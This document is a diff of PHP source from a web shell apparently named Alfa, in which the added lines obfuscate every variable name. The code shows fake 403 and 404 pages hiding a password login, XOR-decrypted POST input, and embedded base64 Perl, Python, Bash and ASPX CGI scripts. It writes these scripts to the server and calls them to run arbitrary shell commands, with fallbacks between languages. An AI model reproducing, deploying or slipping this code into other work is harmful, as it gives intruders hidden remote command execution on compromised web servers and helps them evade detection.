-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+}elseif($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage']=='403'){
+if(@$_COOKIE["AlfaPass"] != @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
+if(@md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
-echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
+echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500."</body></html>".$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f;
 exit;
 }
-}elseif($config['AlfaLoginPage']=='404'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
+}elseif($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaLoginPage']=='404'){
+if(@$_COOKIE["AlfaPass"] != @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass'])){
+if(@md5($_POST["password"])==$yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']){
+__alfa_set_cookie("AlfaUser", $yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaUser']);
+__alfa_set_cookie("AlfaPass", @md5($yzrzmzyl2245023265ae4cf87d02c8b6ba991139['AlfaPass']));
 @header('location: '.$_SERVER["PHP_SELF"]);
 }
-echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
+echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$vfxsqaznf6b7fa7a8e814d2fa0a23fcb00ef8500."</body></html>".$dbsnqidg72cd5e4a97936b8bb2fff3250aec052f;
 exit;
 }
 }
 }
-function decrypt_post($str){
+function decrypt_post($okjeiabf341be97d9aff90c9978347f66f945b77){
 	if(__ALFA_POST_ENCRYPTION__){
-		$pwd = __ALFA_SECRET_KEY__;
-		$pwd     = __ZW5jb2Rlcg($pwd);
-		$str     = __ZGVjb2Rlcg($str);
-		$enc_chr = "";
-		$enc_str = "";
-		$i       = 0;
-		while ($i < strlen($str)) {
-			for ($j = 0; $j < strlen($pwd); $j++) {
-				$enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
-				$enc_str .= $enc_chr;
-				$i++;
-				if ($i >= strlen($str))
+		$mevhntrj9003d1df22eb4d3820015070385194c8 = __ALFA_SECRET_KEY__;
+		$mevhntrj9003d1df22eb4d3820015070385194c8     = __ZW5jb2Rlcg($mevhntrj9003d1df22eb4d3820015070385194c8);
+		$okjeiabf341be97d9aff90c9978347f66f945b77     = __ZGVjb2Rlcg($okjeiabf341be97d9aff90c9978347f66f945b77);
+		$vqtsspcv5431c6e55ec7ee40de7e06ff11bf01d9 = "";
+		$ynfybpyp8ce1d07d1bd95dafc59816063c461486 = "";
+		$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741       = 0;
+		while ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 < strlen($okjeiabf341be97d9aff90c9978347f66f945b77)) {
+			for ($zvhlbqna363b122c528f54df4a0446b6bab05515 = 0; $zvhlbqna363b122c528f54df4a0446b6bab05515 < strlen($mevhntrj9003d1df22eb4d3820015070385194c8); $zvhlbqna363b122c528f54df4a0446b6bab05515++) {
+				$vqtsspcv5431c6e55ec7ee40de7e06ff11bf01d9 = chr(ord($okjeiabf341be97d9aff90c9978347f66f945b77[$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741]) ^ ord($mevhntrj9003d1df22eb4d3820015070385194c8[$zvhlbqna363b122c528f54df4a0446b6bab05515]));
+				$ynfybpyp8ce1d07d1bd95dafc59816063c461486 .= $vqtsspcv5431c6e55ec7ee40de7e06ff11bf01d9;
+				$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
+				if ($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741 >= strlen($okjeiabf341be97d9aff90c9978347f66f945b77))
 					break;
 			}
 		}
-		return __ZGVjb2Rlcg($enc_str);
+		return __ZGVjb2Rlcg($ynfybpyp8ce1d07d1bd95dafc59816063c461486);
 	}else{
-		return __ZGVjb2Rlcg($str);
+		return __ZGVjb2Rlcg($okjeiabf341be97d9aff90c9978347f66f945b77);
 	}
 }
 
 function _AlfaSecretKey(){
-	$secret = @$_COOKIE["AlfaSecretKey"];
+	$epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69 = @$_COOKIE["AlfaSecretKey"];
 	if(!isset($_COOKIE["AlfaSecretKey"])){
-		$secret = uniqid(mt_rand(), true);
-		__alfa_set_cookie("AlfaSecretKey", $secret);
+		$epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69 = uniqid(mt_rand(), true);
+		__alfa_set_cookie("AlfaSecretKey", $epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69);
 	}
-	return $secret;
+	return $epwwthow5ebe2294ecd0e0f08eab7690d2a6ee69;
 }
-function alfa_getColor($target){
-	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
-		return $GLOBALS["DB_NAME"]["color"][$target];
+function alfa_getColor($nyvfphvm42aefbae01d2dfd981f7da7d823d689e){
+	if(isset($GLOBALS["DB_NAME"]["color"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e])&&$GLOBALS["DB_NAME"]["color"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e]!=""){
+		return $GLOBALS["DB_NAME"]["color"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e];
 	}else{
-		$target = $GLOBALS["__ALFA_COLOR__"][$target];
-		if(is_array($target)){
-			return $target["key_color"];
+		$nyvfphvm42aefbae01d2dfd981f7da7d823d689e = $GLOBALS["__ALFA_COLOR__"][$nyvfphvm42aefbae01d2dfd981f7da7d823d689e];
+		if(is_array($nyvfphvm42aefbae01d2dfd981f7da7d823d689e)){
+			return $nyvfphvm42aefbae01d2dfd981f7da7d823d689e["key_color"];
 		}else{
-			return $target;
+			return $nyvfphvm42aefbae01d2dfd981f7da7d823d689e;
 		}
 	}
 }
 function alfaCssLoadColors(){
-	$css = "";
-	foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
-		if(!is_array($value)){
-			$value = alfa_getColor($key);
-			$css .= ".{$key}{color: {$value};}";
+	$wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a = "";
+	foreach($GLOBALS['__ALFA_COLOR__'] as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+		if(!is_array($rkptsoeg2063c1608d6e0baf80249c42e2be5804)){
+			$rkptsoeg2063c1608d6e0baf80249c42e2be5804 = alfa_getColor($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
+			$wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a .= ".{$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d}{color: {$rkptsoeg2063c1608d6e0baf80249c42e2be5804};}";
 		}else{
-			if(isset($value["multi_selector"])){
-				foreach($value["multi_selector"] as $k => $v){
-					$color = alfa_getColor($key);
-					$code = str_replace("{color}", $color, $v);
-					$css .=  $k."{".$code."}";
+			if(isset($rkptsoeg2063c1608d6e0baf80249c42e2be5804["multi_selector"])){
+				foreach($rkptsoeg2063c1608d6e0baf80249c42e2be5804["multi_selector"] as $damiszkt8ce4b16b22b58894aa86c421e8759df3 => $hvlrcxnj9e3669d19b675bd57058fd4664205d2a){
+					$jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd = alfa_getColor($ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d);
+					$nndigmblc13367945d5d4c91047b3b50234aa7ab = str_replace("{color}", $jnvdsdtk70dda5dfb8053dc6d1c492574bce9bfd, $hvlrcxnj9e3669d19b675bd57058fd4664205d2a);
+					$wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a .=  $damiszkt8ce4b16b22b58894aa86c421e8759df3."{".$nndigmblc13367945d5d4c91047b3b50234aa7ab."}";
 				}
 			}
 		}
 	}
-	return $css;
+	return $wksygdxzc7a628cba22e28eb17b5f5c6ae2a266a;
 }
 if(isset($_POST['ajax'])){
 function AlfaNum(){
-$args = func_get_args();
-$alfax = array();
-$find = array();
-for($i=1;$i<=10;$i++){
-$alfax[] = $i;
+$dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 = func_get_args();
+$niytpinla6c6dd28743c140aa4aa98c4669eea39 = array();
+$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4 = array();
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=10;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++){
+$niytpinla6c6dd28743c140aa4aa98c4669eea39[] = $brcjlegv865c0c0b4ab0e063e5caa3387c1a8741;
 }
-foreach($args as $arg){
-$find[] = $arg;
+foreach($dnqkqniqa956af09162870af6ce4ebe0f12ccaf8 as $mcpievhm61dd86c2dc75c3f569ec619bd283a33f){
+$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4[] = $mcpievhm61dd86c2dc75c3f569ec619bd283a33f;
 }
 echo '<script>';
-foreach($alfax as $alfa){
-if(in_array($alfa,$find))
+foreach($niytpinla6c6dd28743c140aa4aa98c4669eea39 as $rpatbarj56aed7e7485ff03d5605b885b86e947e){
+if(in_array($rpatbarj56aed7e7485ff03d5605b885b86e947e,$tpwrlifnea170e2cafb1337755c8b3d5ae4437f4))
 continue;
-echo 'alfa'.$alfa."_=";
+echo 'alfa'.$rpatbarj56aed7e7485ff03d5605b885b86e947e."_=";
 }
 echo '""</script>';
 }}
-function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
+function _alfa_cgicmd($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452,$phbpyamz7572559ca86e781ba8fe8073a0b725c6="perl",$tyuqpazr63073e99b74e1a59a64941ad669a0b98=false){
 	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
 		return "";
 	}
 	if(isset($_COOKIE["alfacgiapi_mode"])){
 		return "";
 	}
-	$cmd_pure = $cmd;
-	$is_curl = function_exists('curl_version');
-	$is_socket = function_exists('fsockopen');
-	if($is_curl||$is_socket){
-		$recreate = false;
+	$quchsrnifc7db3c6a8b7147c6a62ec39e8e24132 = $rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452;
+	$zbctgofs6fa888f32997904f3b5eab4ee64bddb3 = function_exists('curl_version');
+	$pwutrugo50e0f68b64a9345c312075eedbd73abc = function_exists('fsockopen');
+	if($zbctgofs6fa888f32997904f3b5eab4ee64bddb3||$pwutrugo50e0f68b64a9345c312075eedbd73abc){
+		$yufcrtdf6890fdfd4fde05d91446eb8e745c2167 = false;
 		if(isset($_COOKIE["alfacgiapi"])){
 			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
-				$recreate = true;
-				$lang = $_COOKIE["alfacgiapi"];
+				$yufcrtdf6890fdfd4fde05d91446eb8e745c2167 = true;
+				$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_COOKIE["alfacgiapi"];
 			}
 		}
-		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
+		if(!isset($_COOKIE["alfacgiapi"])||$yufcrtdf6890fdfd4fde05d91446eb8e745c2167){
 			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
-			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
-			$bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
-			$aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
-			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
-			if($lang == "aspx"){
-				alfaWriteTocgiapi("aspx.aspx",$aspx);
+			$pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80 = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
+			$jbyuabyldfed5bc177b87ab317c584e06566adc6 = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
+			$ozurlglxd574d4bb40c84861791a694a999cce69 = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
+			$ihvkcopfd77a5a2787362bc36e209f998e621e11 = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
+			if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="perl")$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80;elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="py")$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $jbyuabyldfed5bc177b87ab317c584e06566adc6;else $kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $ozurlglxd574d4bb40c84861791a694a999cce69;
+			if($phbpyamz7572559ca86e781ba8fe8073a0b725c6 == "aspx"){
+				alfaWriteTocgiapi("aspx.aspx",$ihvkcopfd77a5a2787362bc36e209f998e621e11);
 			}else{
-				alfaWriteTocgiapi($lang.".alfa",$source);
+				alfaWriteTocgiapi($phbpyamz7572559ca86e781ba8fe8073a0b725c6.".alfa",$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb);
 			}
 			alfacgihtaccess('cgi', "alfacgiapi/");
 		}else{
-			$lang = $_COOKIE["alfacgiapi"];
+			$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = $_COOKIE["alfacgiapi"];
 		}
-		$cgi_ext = ".alfa";
-		if($lang=="aspx"){
-			$cgi_ext = ".aspx";
+		$cwdfoiuxe09312074a96ab380eed9cbeebb4d907 = ".alfa";
+		if($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="aspx"){
+			$cwdfoiuxe09312074a96ab380eed9cbeebb4d907 = ".aspx";
 		}
-		$cgi_url = __ALFA_DATA_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
-		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
-		if($is_curl){
-			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
-			$post = new AlfaCURL();
-			$data = $post->Send($address, "post", $cmd);
-		}elseif($is_socket){
-			$server = $_SERVER["SERVER_NAME"];
-			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
-			$data = _alfa_fsockopen($server,$uri,$cmd);
+		$ddbbzkzn2c71580f439bd1485e5e5f6c1c27b713 = __ALFA_DATA_FOLDER__."/alfacgiapi/".$phbpyamz7572559ca86e781ba8fe8073a0b725c6.$cwdfoiuxe09312074a96ab380eed9cbeebb4d907;
+		$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
+		if($zbctgofs6fa888f32997904f3b5eab4ee64bddb3){
+			$nfjpllnt884d9804999fc47a3c2694e49ad2536a = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$ddbbzkzn2c71580f439bd1485e5e5f6c1c27b713;
+			$viovyaoc42b90196b487c54069097a68fe98ab6f = new AlfaCURL();
+			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = $viovyaoc42b90196b487c54069097a68fe98ab6f->Send($nfjpllnt884d9804999fc47a3c2694e49ad2536a, "post", $rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
+		}elseif($pwutrugo50e0f68b64a9345c312075eedbd73abc){
+			$patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3 = $_SERVER["SERVER_NAME"];
+			$wtsjcykq9305b73d359bd06734fee0b3638079e1 = dirname($_SERVER["REQUEST_URI"])."/".$ddbbzkzn2c71580f439bd1485e5e5f6c1c27b713;
+			$sfmsaibm8d777f385d3dfec8815d20f7496026dc = _alfa_fsockopen($patmqezkcf1e8c14e54505f60aa10ceb8d5d8ab3,$wtsjcykq9305b73d359bd06734fee0b3638079e1,$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452);
 		}
-		$out = "";
-		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
-			if($set_cookie){
-				__alfa_set_cookie("alfacgiapi", $lang);
+		$vemvtkqkc68271a63ddbc431c307beb7d2918275 = "";
+		if(strpos($sfmsaibm8d777f385d3dfec8815d20f7496026dc, "[solevisible~api]") !== false && strpos($sfmsaibm8d777f385d3dfec8815d20f7496026dc, '[solevisible~api]<pre>"+output+"</pre>') === false){
+			if($tyuqpazr63073e99b74e1a59a64941ad669a0b98){
+				__alfa_set_cookie("alfacgiapi", $phbpyamz7572559ca86e781ba8fe8073a0b725c6);
 			}
-			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
-				$out = $res[1];
+			if(@preg_match("/<pre>(.*?)<\/pre>/s", $sfmsaibm8d777f385d3dfec8815d20f7496026dc, $ybaqpbzt9b207167e5381c47682c6b4f58a623fb)){
+				$vemvtkqkc68271a63ddbc431c307beb7d2918275 = $ybaqpbzt9b207167e5381c47682c6b4f58a623fb[1];
 			}
-		}elseif($lang=="perl"){
-			return _alfa_cgicmd($cmd_pure,"py",$set_cookie);
-		}elseif($lang=="py"){
-			return _alfa_cgicmd($cmd_pure,"bash",$set_cookie);
-		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
-			return _alfa_cgicmd($cmd_pure,"aspx",$set_cookie);
+		}elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="perl"){
+			return _alfa_cgicmd($quchsrnifc7db3c6a8b7147c6a62ec39e8e24132,"py",$tyuqpazr63073e99b74e1a59a64941ad669a0b98);
+		}elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="py"){
+			return _alfa_cgicmd($quchsrnifc7db3c6a8b7147c6a62ec39e8e24132,"bash",$tyuqpazr63073e99b74e1a59a64941ad669a0b98);
+		}elseif($phbpyamz7572559ca86e781ba8fe8073a0b725c6=="bash" && $GLOBALS['sys']=="win"){
+			return _alfa_cgicmd($quchsrnifc7db3c6a8b7147c6a62ec39e8e24132,"aspx",$tyuqpazr63073e99b74e1a59a64941ad669a0b98);
 		}else{
-			if($set_cookie){
+			if($tyuqpazr63073e99b74e1a59a64941ad669a0b98){
 				__alfa_set_cookie("alfacgiapi_mode", "off");
 			}
 		}
-		return trim($out);
+		return trim($vemvtkqkc68271a63ddbc431c307beb7d2918275);
 	}else{
 		return "";
 	}
@@ -740,75 +814,75 @@ function alfaGetCwd(){
 		return dirname($_SERVER["SCRIPT_FILENAME"]);
 	}
 }
-function alfaEx($in,$re=false,$cgi=true,$all=false){
-	$data = _alfa_php_cmd($in,$re);
-	if(empty($data)&&$cgi||$all){
+function alfaEx($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$gjtltovk12eccbdd9b32918131341f38907cbbb5=false,$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda=true,$qcsrkruna181a603769c1f98ad927e7367c7aa51=false){
+	$sfmsaibm8d777f385d3dfec8815d20f7496026dc = _alfa_php_cmd($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf,$gjtltovk12eccbdd9b32918131341f38907cbbb5);
+	if(empty($sfmsaibm8d777f385d3dfec8815d20f7496026dc)&&$aktuwcbj8ddeb2027a8c79b3c46510a6dcef9dda||$qcsrkruna181a603769c1f98ad927e7367c7aa51){
 		if($GLOBALS['sys']=='unix'){
-			if(strlen(_alfa_php_cmd("whoami"))==0||$all){
-				$cmd = _alfa_cgicmd($in);
-				if(!empty($cmd)){
-					return $cmd;
+			if(strlen(_alfa_php_cmd("whoami"))==0||$qcsrkruna181a603769c1f98ad927e7367c7aa51){
+				$rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452 = _alfa_cgicmd($ukaqpdqv13b5bfe96f3e2fe411c9f66f4a582adf);
+				if(!empty($rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452)){
+					return $rifxvzwwdfff0a7fa1a55c8c1a4966c19f6da452;
 				}
 			}
 		}
 	}
-	return $data;
+	return $sfmsaibm8d777f385d3dfec8815d20f7496026dc;
 }
-function _alfa_php_cmd($in,$re=false){
-$out='';
